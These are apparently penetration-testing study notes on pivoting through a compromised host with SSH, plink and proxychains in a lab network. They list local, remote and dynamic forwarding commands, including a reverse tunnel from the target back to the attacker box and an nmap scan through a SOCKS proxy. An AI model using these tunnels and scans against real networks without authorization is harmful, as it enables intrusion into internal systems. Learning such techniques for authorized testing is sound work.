# Port Forwarding Scenario

The Attacking Box (Kali Linux)  
IP: 192.168.1.16    

The Pivot Host (Windows or Linux)  
User: lowuser  
FIRST IP: 192.168.1.30  
SECOND IP: 10.0.0.2    

Web Server (Windows)  
IP: 10.0.0.10    

Goal: To get to the server at 10.0.0.10

### Local Forwarding

From Kali  
`ssh -f -N -L 3390:10.0.0.10:3389 lowuser@192.168.1.30`  
`rdesktop localhost:3390`

Note: To actually connect to RDP on a target, you would need to ensure that either Network Level Authentication is disabled on the target, or that you can obtain a Kerberos TGT.

### Remote Forwarding

Plink.exe is a Windows binary for ssh. It can be found in Kali at:  
`/usr/share/windows-resources/binaries/plink.exe`

From Target  
`ssh -f -N -R 4444:10.0.0.10:80 root@192.168.1.16`  
`plink -f -N -R 4444:10.0.0.10:80 root@192.168.1.16`

From Kali  
`curl 127.0.0.1:4444`

### Dynamic Forwarding

From Kali  
`ssh -f -N -D 8080 lowuser@192.168.1.30`    

`vi /etc/proxychains.conf`  
`[ProxyList]`  
`socks4   127.0.0.1   8080`    

`proxychains nmap -sT -Pn 10.0.0.10`


# Other Tools

HTTPTunnel

stunnel

socat

Reference:
https://www.cybrary.it/0p3n/pivot-network-port-forwardingredirection-hands-look/
https://technostuff.blogspot.com/2008/10/some-useful-socat-commands.html
